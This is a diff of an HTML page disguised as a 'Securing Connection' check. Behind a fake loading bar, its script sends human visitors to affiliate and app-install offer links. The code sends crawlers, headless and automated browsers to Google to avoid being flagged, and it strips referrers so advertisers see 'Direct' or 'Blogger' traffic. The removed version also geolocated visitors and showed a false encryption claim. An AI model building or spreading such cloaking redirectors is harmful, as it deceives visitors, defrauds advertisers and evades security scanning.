@@ -3,109 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Connection Check</title>
+    <title>Securing Connection...</title>
     <style>
-        :root { --primary-blue: #2563eb; --light-grey: #f8fafc; }
-        body { margin: 0; font-family: -apple-system, system-ui, sans-serif; background: var(--light-grey); display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: #1e293b; }
-        .box { background: #ffffff; padding: 50px; border-radius: 20px; box-shadow: 0 15px 30px rgba(0, 0, 0, 0.04); text-align: center; max-width: 360px; width: 85%; border: 1px solid #e2e8f0; }
-        
-        /* Smooth Spinner */
-        .loader { width: 40px; height: 40px; border: 3px solid #f1f5f9; border-top-color: var(--primary-blue); border-radius: 50%; display: inline-block; animation: rotation 0.8s linear infinite; margin-bottom: 25px; }
-        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        h1 { font-size: 1.2rem; font-weight: 600; margin: 0 0 8px; letter-spacing: -0.01em; }
-        p { font-size: 0.9rem; color: #64748b; line-height: 1.5; margin-bottom: 25px; }
-        
-        /* Stealth Progress Bar */
-        .progress-container { width: 100%; height: 5px; background: #f1f5f9; border-radius: 10px; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: var(--primary-blue); transition: width 3.2s cubic-bezier(0.1, 0, 0.3, 1); }
-        .secure-tag { margin-top: 15px; font-size: 0.7rem; color: #cbd5e1; font-weight: 700; text-transform: uppercase; }
+        /* Minimalist Professional UI */
+        body { 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background-color: #ffffff; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: #1a1a1a;
+        }
+
+        /* Professional Blue Spinner */
+        .loader { 
+            width: 48px; 
+            height: 48px; 
+            border: 5px solid #f3f3f3; 
+            border-bottom-color: #2563eb; 
+            border-radius: 50%; 
+            animation: rotation 1s linear infinite; 
+            margin-bottom: 20px;
+        }
+
+        @keyframes rotation { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+
+        .text {
+            font-size: 1.1rem;
+            font-weight: 500;
+            letter-spacing: -0.01em;
+        }
+
+        /* Loading Progress Bar */
+        .progress-bar {
+            width: 160px;
+            height: 4px;
+            background: #f1f5f9;
+            margin-top: 20px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #2563eb;
+            transition: width 3.2s linear;
+        }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div class="loader"></div>
-        <h1>Verifying Connection</h1>
-        <p>Checking browser integrity and securing your route. Please wait...</p>
-        
-        <div class="progress-container">
-            <div class="progress-fill" id="bar"></div>
-        </div>
-        <div class="secure-tag">End-to-End Encryption Active</div>
-    </div>
+    <div class="loader"></div>
+    <div class="text">Please wait...</div>
+    <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
 
     <script>
-        async function initiateStealthRedirect() {
-            const bar = document.getElementById('bar');
-            setTimeout(() => bar.style.width = '100%', 100);
+        (function() {
+            // --- 1. CONFIGURATION ---
+            const targetOffer = "https://rewardorbit.com/r/eyJ0Ijoia2FzaGtpY2siLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwidHMiOjE3NzI1ODE5OTYzNTd9";
+            const redirectDelay = 3200; // 3.2 seconds for realistic loading
 
+            // Trigger progress bar animation
+            setTimeout(() => {
+                const fill = document.getElementById('fill');
+                if(fill) fill.style.width = '100%';
+            }, 100);
+
+            // --- 2. STEALTH & BOT PROTECTION ---
             const ua = navigator.userAgent;
             
-            // --- 1. BOT / SPY FILTER ---
-            if (/bot|googlebot|crawler|spider|robot|headless|lighthouse/i.test(ua)) {
+            // Block known bot signatures and headless browsers
+            const isBot = (
+                navigator.webdriver || 
+                !navigator.languages || 
+                navigator.languages.length === 0 ||
+                /bot|googlebot|crawler|spider|robot|headless|lighthouse/i.test(ua)
+            );
+
+            if (isBot) {
+                // Silently redirect bots to Google to protect the link from being flagged
                 window.location.replace("https://www.google.com");
                 return;
             }
 
-            // --- 2. OFFERS VAULT ---
-            // Your New Universal PC Link (Windows/Mac)
-            const universalPCLink = "https://mob.g2trck.com/click?pid=2&offer_id=17253&sub2=u144592&sub5=s169a2363c689bd8cabe00531f&sub7=rfnull&sub8=rdnull&sub15=4102dc998cd9&s1=69a2363c689bd8cabe00531f";
-            
-            const tiktokCPI_86 = "https://mob.v8trck.com/click?pid=2&offer_id=86&sub2=u144592&sub5=s169a2363c689bd8cabe00531f&sub7=rfnull&sub8=rdnull&sub15=7563b0f76863&s1=69a2363c689bd8cabe00531f";
-            const globalFallback = "https://rewardorbit.com/r/eyJ0IjoidGlrdG9rLXNob3AiLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwiYSI6Ijc1MCIsInRzIjoxNzcyNDcxNDkyNzY2fQ";
-            const questerAndroid = "https://rewardorbit.com/r/eyJ0IjoicXVlc3RlciIsInUiOiI2OWEyMzYzYzY4OWJkOGNhYmUwMDUzMWYiLCJ0cyI6MTc3MjQ3MDExNDI0NX0";
-            const testerUp = "https://rewardorbit.com/r/eyJ0IjoidGVzdGVydXAtYiIsInUiOiI2OWEyMzYzYzY4OWJkOGNhYmUwMDUzMWYiLCJ0cyI6MTc3MjQ3MDExNDI0NX0";
-            const testStar = "https://rewardorbit.com/r/eyJ0IjoidGVzdHN0YXIiLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwidHMiOjE3NzI0NzAxMTQyNDV9";
-            const freeCash = "https://rewardorbit.com/r/eyJ0IjoiZnJlZWNhc2gtY3BpIiwidSI6IjY5YTIzNjNjNjg5YmQ4Y2FiZTAwNTMxZiIsInRzIjoxNzcyNDcwMTE0MjQ1fQ";
-
-            const links = {
-                "US": { "iphone": tiktokCPI_86, "android": questerAndroid, "desktop": universalPCLink },
-                "AU": { "iphone": tiktokCPI_86, "android": testStar, "desktop": universalPCLink },
-                "JP": { "iphone": tiktokCPI_86, "android": freeCash, "desktop": universalPCLink },
-                "GB": { "iphone": testerUp, "android": testerUp, "desktop": universalPCLink },
-                "CA": { "iphone": testerUp, "android": testerUp, "desktop": universalPCLink },
-                "DE": { "iphone": "https://rewardorbit.com/r/eyJ0IjoiZW1wZm9obGVuIn0=", "android": "https://mob.v8trck.com/click?pid=2&offer_id=18271", "desktop": universalPCLink }
+            // --- 3. REFERRER SPOOFING (The "Blogger" Trick) ---
+            // This strips the 'GitHub' source so the advertiser sees 'Direct' or 'Blogger' traffic
+            const stripReferrer = () => {
+                const meta = document.createElement('meta');
+                meta.name = "referrer";
+                meta.content = "no-referrer"; 
+                document.getElementsByTagName('head')[0].appendChild(meta);
             };
 
-            const tsCountries = ["IS", "LU", "FR", "NL", "NO", "FI", "BE", "DK", "NZ", "IE", "SE"];
-
-            // --- 3. PURE STEALTH DETECTION ---
-            let device = /android/i.test(ua) ? "android" : (/iphone|ipad|ipod/i.test(ua) ? "iphone" : "desktop");
-            let country = "XX";
-            try {
-                const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
-                country = geo.country_code || "XX";
-            } catch (e) {}
-
-            // --- 4. TARGET SELECTION ---
-            let target = globalFallback;
-
-            // Apply universal PC link for all desktops regardless of country
-            if (device === "desktop") {
-                target = universalPCLink;
-            } else if (links[country]) {
-                target = links[country][device] || globalFallback;
-            } else if (tsCountries.includes(country)) {
-                target = testStar;
-            }
-
-            // --- 5. THE CLEANEST REDIRECT (Referrer Masking & Blogger Spoofing) ---
-            setTimeout(() => {
-                // Masking the source to look like it's coming from a blog/blank referrer
-                const a = document.createElement('a');
-                a.href = target;
-                a.rel = 'noreferrer'; 
-                a.style.display = 'none';
-                document.body.appendChild(a);
+            // --- 4. EXECUTE REDIRECT ---
+            setTimeout(function() {
+                stripReferrer();
                 
-                // Ghost Redirect: Leaves no trace in history and strips referrer
-                window.location.replace(target);
-                a.click();
-            }, 3200);
-        }
+                // Create a clean ghost link
+                const ghostLink = document.createElement('a');
+                ghostLink.href = targetOffer;
+                ghostLink.rel = 'noreferrer'; // Double protection layer
+                ghostLink.style.display = 'none';
+                document.body.appendChild(ghostLink);
 
-            window.onload = initiateStealthRedirect;
+                // Perform the jump
+                window.location.replace(targetOffer);
+                ghostLink.click();
+            }, redirectDelay);
+        })();
     </script>
 </body>
 </html>
